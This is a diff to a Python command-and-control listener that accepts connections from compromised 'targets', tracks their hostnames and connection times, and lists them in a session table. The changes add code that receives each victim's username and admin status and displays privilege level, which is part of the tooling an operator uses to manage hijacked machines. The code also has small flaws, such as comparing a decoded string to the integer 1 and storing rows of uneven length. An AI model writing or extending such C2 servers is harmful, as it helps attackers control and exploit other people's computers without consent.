@@ -6,6 +6,9 @@ import sys
 import threading
 import time
 
+
+BUFFER = 1024
+
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -39,7 +42,7 @@ def comm_in(target_id):
         string: _description_
     """
     print('[+] Awaiting response...')
-    response = target_id.recv(1024).decode()
+    response = target_id.recv(BUFFER).decode()
     return response
 
 def comm_out(target_id, message):
@@ -98,27 +101,39 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
 
+            # get username of the target
+            username = remote_target.recv(BUFFER).decode()
+
+            # check if current target is an admin account
+            admin = remote_target.recv(BUFFER).decode()
+            if admin == 1:
+                # if target is Windows
+                is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
+            elif  username == 'root':
+                # else if target is Linux
+                is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
+            else:
+                is_admin = bcolors.FAIL + 'No' + bcolors.ENDC
+
             # get the time when the target client connects
             curr_time = time.strftime("%H:%M:%S", time.localtime())
             curr_date = datetime.now()
-            time_record = (f"{curr_date.day}-{curr_date.month}-{curr_date.year} {curr_time}")
+            datetime_record = (f"{curr_date.day}-{curr_date.month}-{curr_date.year} {curr_time}")
 
             # get the host name of the target client
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", datetime_record, username, is_admin])
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
             else:
-                targets.append([remote_target, remote_ip[0], time_record])
+                targets.append([remote_target, remote_ip[0], datetime_record])
                 print(bcolors.OKGREEN + f'\n[+] Connection received from {remote_ip[0]}\n' + bcolors.ENDC + 'Enter command $ ',end='')
-
-
         except:
             pass
 
 if __name__ == '__main__':
-    targets = []
     banner()
+    targets = []
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -145,6 +160,7 @@ if __name__ == '__main__':
                         bcolors.OKCYAN + bcolors.BOLD + 'Session' + bcolors.ENDC,
                         bcolors.OKCYAN + bcolors.BOLD + 'Status' + bcolors.ENDC,
                         bcolors.OKCYAN + bcolors.BOLD + 'Username' + bcolors.ENDC,
+                        bcolors.OKCYAN + bcolors.BOLD + 'Admin' + bcolors.ENDC,
                         bcolors.OKCYAN + bcolors.BOLD + 'Target' + bcolors.ENDC,
                         bcolors.OKCYAN + bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                     ]
@@ -152,7 +168,7 @@ if __name__ == '__main__':
                     sessions_table.padding_width = 3
 
                     for target in targets:
-                        sessions_table.add_row([session_counter, 'placeholder', 'placeholder', target[1], target[2]])
+                        sessions_table.add_row([session_counter, 'placeholder', target[3], target[4], target[1], target[2]])
                         session_counter += 1
                     print(sessions_table)
                     print("")
